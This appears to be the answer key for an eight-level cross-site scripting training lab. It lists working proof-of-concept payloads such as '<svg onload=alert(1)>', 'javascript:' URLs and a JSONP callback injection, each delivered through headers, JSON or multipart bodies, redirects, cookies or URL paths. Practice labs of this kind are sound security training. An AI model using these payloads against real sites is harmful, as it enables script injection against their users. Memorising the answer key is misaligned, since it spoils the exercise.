# realworld_input — solutions

Real-world input vectors: headers, JSON/multipart bodies, redirect sinks, cookies, paths, JSONP.

### realworld_input-level1

`[Header] /realworld-input/level1/`

- payload: `<svg onload=alert(1)>`
- header: `X-Forwarded-For: <svg onload=alert(1)>`
- context: XFF header reflected in 403 body

### realworld_input-level2

`[POST] /realworld-input/level2/`

- payload: `<svg onload=alert(1)>`
- body: `{"name":"<svg onload=alert(1)>"}` (Content-Type: application/json)
- context: JSON body name field reflected raw

### realworld_input-level3

`[POST] /realworld-input/level3/`

- payload: `<svg onload=alert(1)>`
- body: multipart/form-data field `username=<svg onload=alert(1)>`
- context: multipart body field reflected raw

### realworld_input-level4

`/realworld-input/level4/?url=javascript%3Aalert(1)`

- payload: `javascript:alert(1)`
- context: Location header redirect; javascript: triggers when clicked from same-origin context (legacy/curl link)

### realworld_input-level5

`/realworld-input/level5/?url=javascript%3Aalert(1)`

- payload: `javascript:alert(1)`
- context: meta refresh content="0;url=QUERY"

### realworld_input-level6

`/realworld-input/level6/?lang=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: stored via cookie + reflected on same request in body

### realworld_input-level7

`/realworld-input/level7/x%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E`

- payload: `x"><script>alert(1)</script>`
- context: path reflected inside <link rel=canonical href="..."> attribute breakout (body copy is angle-stripped)

### realworld_input-level8

`/realworld-input/level8/?callback=alert(1)%3B%2F%2F`

- payload: `alert(1);//`
- context: JSONP callback name reflected in application/javascript response
